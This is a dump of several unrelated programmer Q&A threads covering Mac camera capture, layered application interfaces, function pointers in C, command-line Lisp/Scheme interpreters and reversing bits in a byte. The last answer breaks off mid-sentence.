 <p>From a related question which specifically asked the solution to be pythonic, you should give a try to <a href=""http://github.com/motmot/pycamiface"" rel=""nofollow"">motmot's camiface</a> library from Andrew Straw. It also works with firewire cameras, but it works also with the isight, which is what you are looking for.</p>

<p>From the tutorial:</p>

<pre><code>import motmot.cam_iface.cam_iface_ctypes as cam_iface
import numpy as np

mode_num = 0
device_num = 0
num_buffers = 32

cam = cam_iface.Camera(device_num,num_buffers,mode_num)
cam.start_camera()
frame = np.asarray(cam.grab_next_frame_blocking())
print 'grabbed frame with shape %s'%(frame.shape,)
</code></pre>
 <p>Well, if you really hate ObjectiveC, Swift is quite a nice language too.</p>

<p>QTKit is deprecated since X.7, use AV Foundation for modern Swift and ObjectiveC apps on OS X.
<a href=""https://developer.apple.com/library/mac/technotes/tn2300/_index.html"" rel=""nofollow"">https://developer.apple.com/library/mac/technotes/tn2300/_index.html</a></p>

<p>Specifically, for OS X.7 and newer, image capture is done by enumerating cameras and such using [AVCaptureDevice devices], then creating an AVCaptureSession, setting up streams: [AVCaptureDeviceInput deviceInputWithDevice: ...] and 
  [ addOutput: ...], then finally [ startRunning].</p>

<p><a href=""https://developer.apple.com/library/mac/documentation/AVFoundation/Reference/AVCaptureSession_Class/"" rel=""nofollow"">https://developer.apple.com/library/mac/documentation/AVFoundation/Reference/AVCaptureSession_Class/</a></p>

<p><a href=""https://developer.apple.com/library/mac/technotes/tn2300/_index.html#//apple_ref/doc/uid/DTS40012852-CH1-MEDIA_CAPTURE_AND_ACCESS_TO_CAMERA"" rel=""nofollow"">https://developer.apple.com/library/mac/technotes/tn2300/_index.html#//apple_ref/doc/uid/DTS40012852-CH1-MEDIA_CAPTURE_AND_ACCESS_TO_CAMERA</a></p>
"
"Interfaces on different logic layers <p>Say you have an application divided into 3-tiers: GUI, business logic, and data access. In your business logic layer you have described your business objects: getters, setters, accessors, and so on... you get the idea. The interface to the business logic layer guarantees safe usage of the business logic, so all the methods and accessors you call will validate input. </p>

<p>This great when you first write the UI code, because you have a neatly defined interface that you can trust.</p>

<p>But here comes the tricky part, when you start writing the data access layer, the interface to the business logic does not accommodate your needs. You need to have more accessors and getters to set fields which are/used to be hidden. Now you are forced to erode the interface of your business logic; now it is possible set fields from the UI layer, which the UI layer has no business setting. </p>

<p>Because of the changes needed for the data access layer, the interface to the business logic has eroded to the point where it is possible to even set the business logic with invalid data. Thus, the interface does not guarantee safe usage anymore.</p>

<p>I hope I explained the problem clearly enough. How do you prevent interface eroding, maintain information hiding and encapsulation, and yet still accommodate different interface needs among different layers? </p>
 <p>I always create a separate assembly that contains:  </p>

<ul>
<li>A lot of small Interfaces (think ICreateRepository, IReadRepository, IReadListRepsitory.. the list goes on and most of them relies heavily on generics)  </li>
<li>A lot of concrete Interfaces, like an IPersonRepository, that inherits from IReadRepository, you get the point..<br />
Anything you cannot describe with just the smaller interfaces, you put into the concrete interface.<br />
As long as you use the IPersonRepository to declare your object, you get a clean, consistent interface to work with. But the kicker is, you can also make a class that takes f.x. a ICreateRepository in its constructor, so the code will end up being very easy to do some really funky stuff with. There are also interfaces for the Services in the business tier here.</li>
<li>At last i stick all the domain objects into the extra assembly, just to make the code base itself a bit cleaner and more loosely coupled. These objects dont have any logic, they are just a common way to describe the data for all 3+ layers.</li>
</ul>

<p>Btw. Why would you define methods in the business logic tier to accommodate the data tier?<br />
The data tier should have no reason to even know there is a business tier..</p>
 <p>It could be a solution, as it would not erode the interface. I guess you could have a class like this:</p>

<pre><code>public class BusinessObjectRecord : BusinessObject
{
}
</code></pre>
 <p>What do you mean by that the data tier should not be aware of the business logic tier? How would you fill an business object with data?</p>

<p>I often do this:</p>

<pre><code>namespace Data
{
    public class BusinessObjectDataManager
    {
         public void SaveObject(BusinessObject object)
         {
                // Exec stored procedure
         {
    }
}
</code></pre>
 <p>This is a classic problem - separating your domain model from your database model. There are several ways to attack it, it really depends on the size of your project in my opinion. You could use the repository pattern as others have said. If you are using .net or java you could use <a href=""http://www.hibernate.org/343.html"" rel=""nofollow"">NHibernate</a> or <a href=""http://www.hibernate.org/"" rel=""nofollow"">Hibernate</a>. </p>

<p>What I do is use <a href=""http://en.wikipedia.org/wiki/Test-driven_development"" rel=""nofollow"">Test Driven Development</a> so I write my UI and Model layers first and the Data layer is mocked, so the UI and model is build around domain specific objects, then later I map these object to what ever technology I'm using the the Data Layer. Is a very bad idea to let the database determine the design of your app, write the app first and think about the data later.</p>

<p>ps the title of the question is a little mis-leading</p>
 <p>@Ice^^Heat:</p>

<blockquote>
  <p>What do you mean by that the data tier should not be aware of the business logic tier? How would you fill an business object with data?</p>
</blockquote>

<p>The UI asks the ServiceClass in the business tier for a service, namely getting a list of objects filtered by an object with the needed parameter data.<br />
Then the ServiceClass creates an instance of one of the repository classes in the data tier, and calls the GetList(ParameterType filters).<br />
Then the data tier accesses the database, pulls up the data, and maps it to the common format defined in the ""domain"" assembly.<br />
The BL has no more work to do with this data, so it outputs it to the UI.</p>

<p>Then the UI wants to edit Item X. It sends the item (or business object) to the service in the Business Tier. The business tier validates the object, and if it is OK, it sends it to the data tier for storage.</p>

<p>The UI knows the service in the business tier which again knows about the data tier.</p>

<p>The UI is responsible for mapping the users data input to and from the objects, and the data tier is responsible for mapping the data in the db to and from the objects. The Business tier stays purely business. :)</p>
 <p>So the problem is that the business layer needs to expose more functionality to the data layer, and adding this functionality means exposing too much to the UI layer?  If I'm understanding your problem correctly, it sounds like you're trying to satisfy too much with a single interface, and that's just causing it to become cluttered.  Why not have two interfaces into the business layer?  One would be a simple, safe interface for the UI layer.  The other would be a lower-level interface for the data layer.</p>

<p>You can apply this two-interface approach to any objects which need to be passed to both the UI and the data layers, too.</p>

<pre><code>public class BusinessLayer : ISimpleBusiness
{}

public class Some3LayerObject : ISimpleSome3LayerObject
{}
</code></pre>
 <p>You may want to split your interfaces into two types, namely:</p>

<ul>
<li>View interfaces -- which are interfaces that specify your interactions with your UI, and</li>
<li>Data interfaces -- which are interfaces that will allow you to specify interactions with your data</li>
</ul>

<p>It is possible to inherit and implement both set of interfaces such that:</p>

<pre><code>public class BusinessObject : IView, IData
</code></pre>

<p>This way, in your data layer you only need to see the interface implementation of IData, while in your UI you only need to see the interface implementation of IView.</p>

<p>Another strategy you might want to use is to compose your objects in the UI or Data layers such that they are merely consumed by these layers, e.g.,</p>

<pre><code>public class BusinessObject : DomainObject

public class ViewManager&lt;T&gt; where T : DomainObject

public class DataManager&lt;T&gt; where T : DomainObject
</code></pre>

<p>This in turn allows your business object to remain ignorant of both the UI/View layer and the data layer.</p>
 <p>If I understand the question correctly, you've created a domain model and you would like to write an object-relational mapper to map between records in your database and your domain objects. However, you're concerned about polluting your domain model with the 'plumbing' code that would be necessary to read and write to your object's fields.</p>

<p>Taking a step back, you essentially have two choices of where to put your data mapping code - within the domain class itself or in an external mapping class.
The first option is often called the Active Record pattern and has the advantage that each object knows how to persist itself and has sufficient access to its internal structure to allow it to perform the mapping without needing to expose non-business related fields.</p>

<p>E.g</p>

<pre><code>public class User
{
	private string name;
	private AccountStatus status;

	private User()
	{
	}

	public string Name
	{
		get { return name; }
		set { name = value; }
	}

	public AccountStatus Status
	{
		get { return status; }
	}

	public void Activate()
	{
		status = AccountStatus.Active;
	}

	public void Suspend()
	{
		status = AccountStatus.Suspended;
	}

	public static User GetById(int id)
	{
		User fetchedUser = new User();

		// Lots of database and error-checking code
		// omitted for clarity
		// ...

		fetchedUser.name = (string) reader[""Name""];
		fetchedUser.status = (int)reader[""statusCode""] == 0 ? AccountStatus.Suspended : AccountStatus.Active;

		return fetchedUser;
	}

	public static void Save(User user)
	{
		// Code to save User's internal structure to database
		// ...
	}
}
</code></pre>

<p>In this example, we have an object that represents a User with a Name and an AccountStatus. We don't want to allow the Status to be set directly, perhaps because we want to check that the change is a valid status transition, so we don't have a setter. Fortunately, the mapping code in the GetById and Save static methods have full access to the object's name and status fields.</p>

<p>The second option is to have a second class that is responsible for the mapping. This has the advantage of seperating out the different concerns of business logic and persistence which can allow your design to be more testable and flexible. The challenge with this method is how to expose the name and status fields to the external class. Some options are:
  1. Use reflection (which has no qualms about digging deep into your object's private parts)
  2. Provide specially-named, public setters (e.g. prefix them with the word 'Private') and hope no one uses them accidentally
  3. If your language suports it, make the setters internal but grant your data mapper module access. E.g. use the InternalsVisibleToAttribute in .NET 2.0 onwards or friend functions in C++</p>

<p>For more information, I'd recommend Martin Fowler's classic book 'Patterns of Enterprise Architecture'</p>

<p>However, as a word of warning, before going down the path of writing your own mappers I'd strongly recommend looking at using a 3rd-party object relational mapper (ORM) tool such as nHibernate or Microsoft's Entity Framework. I've worked on four different projects where, for various reasons, we wrote our own mapper and it is very easy to waste a lot of time maintaining and extending the mapper instead of writing code that provides end user value. I've used nHibernate on one project so far and, although it has quite a steep learning curve initially, the investment you put in early on pays off considerably.</p>
 <p>I'm going to continue my habit of going against the grain and say that you should question why you are building all these horribly complex object layers.</p>

<p>I think many developers think of the database as a simple persistence layer for their objects, and are only concerned with the CRUD operations that those objects need.  Too much effort is being put into the ""impedence mismatch"" between object and relational models.  Here's an idea: stop trying.</p>

<p>Write stored procedures to encapsulate your data.  Use results sets, DataSet, DataTable, SqlCommand (or the java/php/whatever equivalent) as needed from code to interact with the database.  You don't need those objects.  An excellent example is embedding a SqlDataSource into a .ASPX page.</p>

<p>You shouldn't try to hide your data from anyone.  Developers need to understand exactly how and when they are interacting with the physical data store.</p>

<p>Object-relational mappers are the devil.  Stop using them.</p>

<p>Building enterprise applications is often an exercise in managing complexity.  You have to keep things as simple as possible, or you will have an absolutely un-maintainable system.  If you are willing to allow some coupling (which is inherent in any application anyway), you can do away with both your business logic layer and your data access layer (replacing them with stored procedures), and you won't need any of those interfaces.</p>
"
"How do you pass a function as a parameter in C? <p>I want to create a function that performs a function passed by parameter on a set of data. How do you pass a function as a parameter in C?</p>
 <p>You need to pass a <a href=""http://www.newty.de/fpt/fpt.html#passPtr"" rel=""nofollow"" title=""Unison Home Page"">function pointer</a>.  The syntax is a little cumbersome, but it's really powerful once you get familiar with it.</p>
 <p><strong>Declaration</strong></p>

<p>A prototype for a function which takes a function parameter looks like the following:</p>

<pre><code>void func ( void (*f)(int) );
</code></pre>

<p>This states that the parameter <code>f</code> will be a pointer to a function which has a <code>void</code> return type and which takes a single <code>int</code> parameter. The following function (<code>print</code>) is an example of a function which could be passed to <code>func</code> as a parameter because it is the proper type:</p>

<pre><code>void print ( int x ) {
  printf(""%d\n"", x);
}
</code></pre>

<p><strong>Function Call</strong></p>

<p>When calling a function with a function parameter, the value passed must be a pointer to a function. Use the function's name (without parentheses) for this:</p>

<pre><code>func(print);
</code></pre>

<p>would call <code>func</code>, passing the print function to it.</p>

<p><strong>Function Body</strong></p>

<p>As with any parameter, func can now use the parameter's name in the function body to access the value of the parameter. Let's say that func will apply the function it is passed to the numbers 0-4. Consider, first, what the loop would look like to call print directly:</p>

<pre><code>for ( int ctr = 0 ; ctr &lt; 5 ; ctr++ ) {
  print(ctr);
}
</code></pre>

<p>Since <code>func</code>'s parameter declaration says that <code>f</code> is the name for a pointer to the desired function, we recall first that if <code>f</code> is a pointer then <code>*f</code> is the thing that <code>f</code> points to (i.e. the function <code>print</code> in this case). As a result, just replace every occurrence of print in the loop above with <code>*f</code>:</p>

<pre><code>void func ( void (*f)(int) ) {
  for ( int ctr = 0 ; ctr &lt; 5 ; ctr++ ) {
    (*f)(ctr);
  }
}
</code></pre>

<p>From <a href=""http://math.hws.edu/bridgeman/courses/331/f05/handouts/c-c++-notes.html"">http://math.hws.edu/bridgeman/courses/331/f05/handouts/c-c++-notes.html</a></p>
 <p>This question already has the answer for defining function pointers, however they can get very messy, especially if you are going to be passing them around your application. To avoid this unpleasantness I would recommend that you typedef the function pointer into something more readable. For example.</p>

<pre><code>typedef void (*functiontype)();
</code></pre>

<p>Declares a function that returns void and takes no arguments. To create a function pointer to this type you can now do:</p>

<pre><code>void dosomething() { }

functiontype func = &amp;dosomething;
func();
</code></pre>

<p>For a function that returns an int and takes a char you would do</p>

<pre><code>typedef int (*functiontype2)(char);
</code></pre>

<p>and to use it</p>

<pre><code>int dosomethingwithchar(char a) { return 1; }

functiontype2 func2 = &amp;dosomethingwithchar
int result = func2('a');
</code></pre>

<p>There are libraries that can help with turning function pointers into nice readable types. The <a href=""http://www.boost.org/doc/libs/1_36_0/doc/html/function.html"">boost function</a> library is great and is well worth the effort!</p>

<pre><code>boost::function&lt;int (char a)&gt; functiontype2;
</code></pre>

<p>is so much nicer than the above.</p>
 <p>Since C++11 you can use the following the <a href=""http://www.cplusplus.com/reference/functional/function/function/"">functional library</a> to do this in a succinct and generic fashion. The syntax is, e.g.,</p>

<pre><code>std::function&lt;bool (int)&gt;
</code></pre>

<p>where <code>bool</code> is the return type here of a one-argument function whose first argument is of type <code>int</code>.</p>

<p>I have included an example program below:</p>

<pre><code>// g++ test.cpp --std=c++11
#include &lt;functional&gt;

double Combiner(double a, double b, std::function&lt;double (double,double)&gt; func){
  return func(a,b);
}

double Add(double a, double b){
  return a+b;
}

double Mult(double a, double b){
  return a*b;
}

int main(){
  Combiner(12,13,Add);
  Combiner(12,13,Mult);
}
</code></pre>
 <p>Pass <strong>address of a function as parameter to another function</strong> as shown below</p>

<pre><code>#include &lt;stdio.h&gt;

void print();
void execute(void());

int main()
{
    execute(print); // sends address of print
    return 0;
}

void print()
{
    printf(""Hello!"");
}

void execute(void f()) // receive address of print
{
    f();
}
</code></pre>

<p>Also we can pass function as parameter using <strong>function pointer</strong></p>

<pre><code>#include &lt;stdio.h&gt;

void print();
void execute(void (*f)());

int main()
{
    execute(&amp;print); // sends address of print
    return 0;
}

void print()
{
    printf(""Hello!"");
}

void execute(void (*f)()) // receive address of print
{
    f();
}
</code></pre>
"
"Lisp/Scheme interpreter without Emacs? <p><br />
I've been wanting to teach myself Lisp for a while.  However, all the interpreters of which I've heard involve some flavor of emacs.
Are there any command line interpreters, such that I could type this into the command line:</p>

<blockquote>
  <p>lispinterpret sourcefile.lisp</p>
</blockquote>

<p>just like I can run perl or python.</p>

<p>While I'd also like to become more familiar with Emacs (if only not to be frustrated when I work with somebody who uses Emacs), I'd rather decouple learning Emacs from learning Lisp.</p>

<p>Edit: I actually want to follow SICP which uses Scheme, so an answer about Scheme would be more useful.  I'm just not that familiar with the differences.</p>
 <p>Checkout CLISP <a href=""http://en.wikipedia.org/wiki/CLISP"">wiki-link</a> that ie. was used by Paul Graham</p>

<p>Direct <a href=""http://clisp.cons.org/"">link</a></p>
 <p>Did you try Allegro CL from <a href=""http://www.franz.com/"" rel=""nofollow"">http://www.franz.com/</a>?</p>
 <p>You could also try <a href=""http://www.plt-scheme.org/"">DrScheme</a>, which whilst not exactly a standalone interpreter, isn't emacs :)</p>

<p>It's basically a simple IDE that has an area to type in code that can be executed as a file, and then another area that is the running interpreter that you can interact with.</p>

<p>(Also, find the UC Berkeley CS61A podcasts and listen to them, as well as reading SICP)</p>
 <p>It looks like Steel Bank Common Lisp (SBCL) also caters to what you want:</p>

<p><a href=""http://www.sbcl.org/manual/Shebang-Scripts.html#Shebang-Scripts"" rel=""nofollow"">http://www.sbcl.org/manual/Shebang-Scripts.html#Shebang-Scripts</a></p>

<p>SBCL is both top rate and open source.</p>
 <p>@Nathan: I've upmodded the Common Lisp links, because you asked about Lisp (especially with reference to Emacs Lisp). However, Common Lisp is very different from Scheme. A program written for one is unlikely to run on the other.</p>

<p>As you mentioned, SICP is for learning Scheme, not Lisp (or at least, not Common Lisp and not Emacs Lisp). There are some overlap in principles, however you can't simply cut and paste code from SICP and expect it to run on any Common Lisp or Emacs Lisp system. :-)</p>
 <p>Another good dialect of lisp is <a href=""http://www.google.com/url?sa=t&amp;ct=res&amp;cd=1&amp;url=http%3A%2F%2Fwww.cons.org%2Fcmucl%2F&amp;ei=04CjSMesMIKWsAPkreiEDw&amp;usg=AFQjCNEaD4T5bkSLBKWylon98jBsL7-IGA&amp;sig2=W3p2EItQZ4NdWN8YCzPbRg"" rel=""nofollow"">cmucl</a>.  They used to love to brag about being the ""fastest"" lisp.</p>
 <p>The most widely used IDE for Common Lisp, particularly in the free software subset of the community, is in fact <a href=""http://common-lisp.net/project/slime/"" rel=""nofollow"">SLIME</a>, which runs on Emacs. You can use whatever CL compiler you prefer and invoke Lisp source files the way you describe, but if you do that, you won't be taking advantage of many of Lisps dynamic features that are so incredibly useful while developing your application.</p>

<p>I suggest you take a look at this <a href=""http://common-lisp.net/project/movies/movies/slime.mov"" rel=""nofollow"">SLIME demonstration video</a> to see what I mean, even though it might be a bit outdated at this point.</p>

<p>If the problem is that you (think you) don't like Emacs, I seriously suggest you try to learn it. Seriously. No, really, I mean that. However, there are alternatives, such as the IDEs provided by commercial Lisp implementations such as <a href=""http://www.franz.com/products/allegrocl/"" rel=""nofollow"">Allegro</a> and <a href=""http://www.lispworks.com/downloads/index.html"" rel=""nofollow"">Lispworks</a> (free trials available), or an Eclipse plug-in called <a href=""http://bitfauna.com/projects/cusp/"" rel=""nofollow"">Cusp</a>. </p>
 <p>I often write lisp shell scripts which start with this line:</p>

<p>#!/usr/bin/clisp</p>

<p>Then you don't even need to type ""lispinterpret"" on the command-line.  Just mark the script executable and run it directly.</p>
 <p>No ""interpreter"" requires emacs. </p>

<p>Also, emacs can run elisp in a headless manner.</p>
 <p>If you are looking for Scheme to work with the SICP, take a look at MIT/GNU Scheme</p>

<p><a href=""http://groups.csail.mit.edu/mac/projects/scheme/"" rel=""nofollow"">http://groups.csail.mit.edu/mac/projects/scheme/</a></p>

<p><a href=""http://www.gnu.org/software/mit-scheme/index.html"" rel=""nofollow"">http://www.gnu.org/software/mit-scheme/index.html</a></p>
 <p>It seems like scheme shell is suitable for your purpose.
Take a look at <a href=""http://www.scsh.net/index.html"" rel=""nofollow"">http://www.scsh.net/index.html</a></p>
 <p>Most scheme interpreters that I am familiar with can be run from the command line.  (Much of the list below is extracted from the comparative table at Alexey Radul's <a href=""http://web.mit.edu/~axch/www/scheme/choices.html"" rel=""nofollow"">Scheme Implementation Choices</a> page.  There is a more extensive list at <a href=""http://community.schemewiki.org/?scheme-faq-standards#implementations"" rel=""nofollow"">schemewiki</a> but that page does not immediately provide command-line invocation syntax.)</p>

<p>Here's how you run a number of implementations at the command line:</p>

<ul>
<li><p><a href=""http://www.scheme.com/"" rel=""nofollow"">Chez Scheme</a>: <code>scheme</code>, <code>petite</code></p></li>
<li><p><a href=""http://swiss.csail.mit.edu/projects/scheme/"" rel=""nofollow"">MIT Scheme</a>: <code>mit-scheme</code></p></li>
<li><p><a href=""http://s48.org/"" rel=""nofollow"">Scheme 48</a>: <code>scheme48</code></p></li>
<li><p><a href=""http://www.rscheme.org/"" rel=""nofollow"">RScheme</a>: <code>rs</code></p></li>
<li><p><a href=""http://racket-lang.org/"" rel=""nofollow"">Racket</a>: <code>racket</code> (But I recommend trying the DrRacket IDE, especially for beginners.)</p></li>
<li><p><a href=""http://www.gnu.org/software/guile/guile.html"" rel=""nofollow"">Guile</a>: <code>guile</code></p></li>
<li><p><a href=""http://www-sop.inria.fr/mimosa/fp/Bigloo/"" rel=""nofollow"">Bigloo</a>: <code>bigloo</code></p></li>
<li><p><a href=""http://www.call-with-current-continuation.org/"" rel=""nofollow"">Chicken</a>: <code>csi</code></p></li>
<li><p><a href=""http://dynamo.iro.umontreal.ca/~gambit/wiki/index.php/Main_Page"" rel=""nofollow"">Gambit</a>: <code>gsi</code></p></li>
<li><p><a href=""http://practical-scheme.net/gauche/"" rel=""nofollow"">Gauche</a>: <code>gosh</code></p></li>
<li><p><a href=""http://ironscheme.codeplex.com/"" rel=""nofollow"">IronScheme</a>: <code>IronScheme.Console</code></p></li>
<li><p><a href=""http://www.gnu.org/software/kawa/"" rel=""nofollow"">Kawa</a>: <code>kawa</code>, <code>java kawa.repl</code></p></li>
<li><p><a href=""http://www.larcenists.org/"" rel=""nofollow"">Larceny</a>: <code>larceny</code></p></li>
<li><p><a href=""http://swissnet.ai.mit.edu/~jaffer/SCM.html"" rel=""nofollow"">SCM</a>: <code>scm</code></p></li>
</ul>
"
"How can I reverse the ON bits in a byte? <p>I was reading Joel's book where he was suggesting as interview question:</p>

<blockquote>
  <p>Write a program to reverse the ""ON"" bits in a given byte.</p>
</blockquote>

<p>I only can think of a solution using C. </p>

<p>Asking here so you can show me how to do in a Non C way (if possible)</p>
 <p>What specifically does that question mean?</p>

<p>Does <em>reverse</em> mean setting 1's to 0's and vice versa?</p>

<p>Or does it mean <em>00001100</em> --> <em>00110000</em> where you reverse their order in the byte? Or perhaps just reversing the part that is from the first 1 to the last 1? ie. <em>00110101</em> --> <em>00101011</em>?</p>

<p>Assuming it means reversing the bit order in the whole byte, here's an x86 assembler version:</p>

<pre><code>; al is input register
; bl is output register

xor bl, bl      ; clear output

; first bit
rcl al, 1       ; rotate al through carry
rcr bl, 1       ; rotate carry into bl

; duplicate above 2-line statements 7 more times for the other bits
</code></pre>

<p>not the most optimal solution, a table lookup is faster.</p>
 <p>Reversing the order of bits in C#:</p>

<pre><code>byte ReverseByte(byte b)
{
    byte r = 0;
    for(int i=0; i&lt;8; i++)
    {
        int mask = 1 &lt;&lt; i;
        int bit = (b &amp; mask) &gt;&gt; i;
        int reversedMask = bit &lt;&lt; (7 - i);
        r |= (byte)reversedMask;
    }
    return r;
}
</code></pre>

<p>I'm sure there are more clever ways of doing it but in that precise case, the interview question is meant to determine if you know bitwise operations so I guess this solution would work.</p>

<p>In an interview, the interviewer usually wants to know how you find a solution, what are you problem solving skills, if it's clean or if it's a hack. So don't come up with too much of a clever solution because that will <em>probably</em> mean you found it somewhere on the Internet beforehand. Don't try to fake that you don't know it neither and that you just come up with the answer because you are a genius, this is will be even worst if she figures out since you are basically lying.</p>
 <p>The classic <a href=""http://graphics.stanford.edu/~seander/bithacks.html"" rel=""nofollow"">Bit Hacks</a> page has several (really very clever) ways to do this, but it's all in C. Any language derived from C syntax (notably Java) will likely have similar methods. I'm sure we'll get some Haskell versions in this thread ;)</p>
 <blockquote>
  <p><code>byte ReverseByte(byte b)
  {
      return b ^ 0xff;
  }</code></p>
</blockquote>

<p>That works if <code>^</code> is XOR in your language, but not if it's <code>AND</code>, which it often is.</p>
 <blockquote>
  <p>What specifically does that question mean?</p>
</blockquote>

<p>Good question.  If reversing the ""ON"" bits means reversing only the bits that are ""ON"", then you will always get 0, no matter what the input is.  If it means reversing <em>all</em> the bits, i.e. changing all 1s to 0s and all 0s to 1s, which is how I initially read it, then that's just a bitwise NOT, or complement.  C-based languages have a complement operator, <code>~</code>, that does this.  For example:</p>

<pre><code>unsigned char b = 102;      /* 0x66, 01100110 */
unsigned char reverse = ~b; /* 0x99, 10011001 */
</code></pre>
 <p>If you're talking about switching 1's to 0's and 0's to 1's, using Ruby:</p>

<pre><code>n = 0b11001100
~n
</code></pre>

<p>If you mean reverse the order:</p>

<pre><code>n = 0b11001100
eval(""0b"" + n.to_s(2).reverse)
</code></pre>

<p>If you mean counting the on bits, as mentioned by another user:</p>

<pre><code>n = 123
count = 0
0.upto(8) { |i| count = count + n[i] }
</code></pre>

<p>♥ Ruby</p>
 <p>I'm probably misremembering, but I thought that Joel's question was about <strong>counting</strong> the ""on"" bits rather than reversing them.</p>
 <p>Since the question asked for a non-C way, here's a Scheme implementation, cheerfully plagiarised from <a href=""http://people.csail.mit.edu/jaffer/SLIB"" rel=""nofollow"">SLIB</a>:</p>

<pre><code>(define (bit-reverse k n)
  (do ((m (if (negative? n) (lognot n) n) (arithmetic-shift m -1))
       (k (+ -1 k) (+ -1 k))
       (rvs 0 (logior (arithmetic-shift rvs 1) (logand 1 m))))
      ((negative? k) (if (negative? n) (lognot rvs) rvs))))

(define (reverse-bit-field n start end)
  (define width (- end start))
  (let ((mask (lognot (ash -1 width))))
    (define zn (logand mask (arithmetic-shift n (- start))))
    (logior (arithmetic-shift (bit-reverse width zn) start)
            (logand (lognot (ash mask start)) n))))
</code></pre>

<p>Rewritten as C (for people unfamiliar with Scheme), it'd look something like this (with the understanding that in Scheme, numbers can be arbitrarily big):</p>

<pre><code>int
bit_reverse(int k, int n)
{
    int m = n &lt; 0 ? ~n : n;
    int rvs = 0;
    while (--k &gt;= 0) {
        rvs = (rvs &lt;&lt; 1) | (m &amp; 1);
        m &gt;&gt;= 1;
    }
    return n &lt; 0 ? ~rvs : rvs;
}

int
reverse_bit_field(int n, int start, int end)
{
    int width = end - start;
    int mask = ~(-1 &lt;&lt; width);
    int zn = mask &amp; (n &gt;&gt; start);
    return (bit_reverse(width, zn) &lt;&lt; start) | (~(mask &lt;&lt; start) &amp; n);
}
</code></pre>
 <p>And here's a version directly cut and pasted from <a href=""http://openjdk.java.net/"" rel=""nofollow"">OpenJDK</a>, which is interesting because it involves no loop. On the other hand, unlike the Scheme version I posted, this version only works for 32-bit and 64-bit numbers. :-)</p>

<p>32-bit version:</p>

<pre><code>public static int reverse(int i) {
    // HD, Figure 7-1
    i = (i &amp; 0x55555555) &lt;&lt; 1 | (i &gt;&gt;&gt; 1) &amp; 0x55555555;
    i = (i &amp; 0x33333333) &lt;&lt; 2 | (i &gt;&gt;&gt; 2) &amp; 0x33333333;
    i = (i &amp; 0x0f0f0f0f) &lt;&lt; 4 | (i &gt;&gt;&gt; 4) &amp; 0x0f0f0f0f;
    i = (i &lt;&lt; 24) | ((i &amp; 0xff00) &lt;&lt; 8) |
        ((i &gt;&gt;&gt; 8) &amp; 0xff00) | (i &gt;&gt;&gt; 24);
    return i;
}
</code></pre>

<p>64-bit version:</p>

<pre><code>public static long reverse(long i) {
    // HD, Figure 7-1
    i = (i &amp; 0x5555555555555555L) &lt;&lt; 1 | (i &gt;&gt;&gt; 1) &amp; 0x5555555555555555L;
    i = (i &amp; 0x3333333333333333L) &lt;&lt; 2 | (i &gt;&gt;&gt; 2) &amp; 0x3333333333333333L;
    i = (i &amp; 0x0f0f0f0f0f0f0f0fL) &lt;&lt; 4 | (i &gt;&gt;&gt; 4) &amp; 0x0f0f0f0f0f0f0f0fL;
    i = (i &amp; 0x00ff00ff00ff00ffL) &lt;&lt; 8 | (i &gt;&gt;&gt; 8) &amp; 0x00ff00ff00ff00ffL;
    i = (i &lt;&lt; 48) | ((i &amp; 0xffff0000L) &lt;&lt; 16) |
        ((i &gt;&gt;&gt; 16) &amp; 0xffff0000L) | (i &gt;&gt;&gt; 48);
    return i;
}
</code></pre>
 <blockquote>
  <p>I'm probably misremembering, but I
  thought that Joel's question was about
  counting the ""on"" bits rather than
  reversing them.</p>
</blockquote>

<p>Here you go:</p>

<pre><code>#include &lt;stdio.h&gt;

int countBits(unsigned char byte);

int main(){
  FILE* out = fopen( ""bitcount.c"" ,""w"");

  int i;
  fprintf(out, ""#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;time.h&gt;\n\n"");

  fprintf(out, ""int bitcount[256] = {"");
  for(i=0;i&lt;256;i++){
    fprintf(out, ""%i"", countBits((unsigned char)i));
    if( i &lt; 255 ) fprintf(out, "", "");
  }
  fprintf(out, ""};\n\n"");

  fprintf(out, ""int main(){\n"");

  fprintf(out, ""srand ( time(NULL) );\n"");
  fprintf(out, ""\tint num = rand() %% 256;\n"");
  fprintf(out, ""\tprintf(\""The byte %%i has %%i bits set to ON.\\n\"", num, bitcount[num]);\n"");

  fprintf(out, ""\treturn 0;\n"");
  fprintf(out, ""}\n"");
  fclose(out);

  return 0;
}

int countBits(unsigned char byte){
  unsigned char mask = 1;
  int count = 0;
  while(mask){
    if( mask&amp;byte ) count++;
    mask &lt;&lt;= 1;
  }
  return count;
}
</code></pre>
 <p>Here's the obligatory Haskell soln for complementing the bits, it uses the library function, complement:</p>

<pre><code>import Data.Bits
import Data.Int

i = 123::Int
i32 = 123::Int32
i64 = 123::Int64
var2 = 123::Integer

test1 = sho i
test2 = sho i32
test3 = sho i64
test4 = sho var2 -- Exception

sho i = putStrLn $ showBits i ++ ""\n"" ++ (showBits $complement i)
showBits  v = concatMap f (showBits2 v) where
   f False = ""0""
   f True  = ""1""
showBits2 v = map (testBit v) [0..(bitSize v - 1)]
</code></pre>
 <p>I'd modify palmsey's second example, eliminating a bug and eliminating the <code>eval</code>:</p>

<pre><code>n = 0b11001100
n.to_s(2).rjust(8, '0').reverse.to_i(2)
</code></pre>

<p>The <code>rjust</code> is important if the number to be bitwise-reversed is a fixed-length bit field -- without it, the reverse of <code>0b00101010</code> would be <code>0b10101</code> rather than the correct <code>0b01010100</code>.  (Obviously, the 8 should be replaced with the length in question.)  I just got tripped up by this one.</p>
 <p>If the question means to flip all the bits, and you aren't allowed to use C-like operators such as XOR and NOT, then this will work:</p>

<pre><code>bFlipped = -1 - bInput;
</code></pre>
 <p>I claim trick question. :) Reversing all bits means a flip-flop, but only the bits that are on clearly means:</p>

<pre><code>return 0;
</code></pre>
 <p>pseudo code..</p>

<pre><code>while (Read())
  Write(0);
</code></pre>
 <blockquote>
  <p>Asking here so you can show me how to do in a <strong>Non C way</strong> (if possible)</p>
</blockquote>

<p>Say you have the number 10101010. To change 1s to 0s (and vice versa) you just use XOR:</p>

<pre><code> 10101010
^11111111
 --------
 01010101
</code></pre>

<p>Doing it by hand is about as ""Non C"" as you'll get.</p>

<p>However from the wording of the question it really sounds like it's <em>only</em> turning off ""ON"" bits... In which case the answer is zero (as has already been mentioned) (unless of course the question is actually asking to swap the order of the bits).</p>
 <p>Reversing the bits.
For example we have a number represented by 01101011 . Now if we reverse the bits then this number will become 11010110. Now to achieve this you should first know how to do swap two bits in a number.
Swapping two bits in a  number:-
XOR both the bits with one and see if results are different. If they are not then both the bits are same otherwise XOR both the bits with XOR and save it in its original number;
Now for reversing the number 
FOR I less than Numberofbits/2
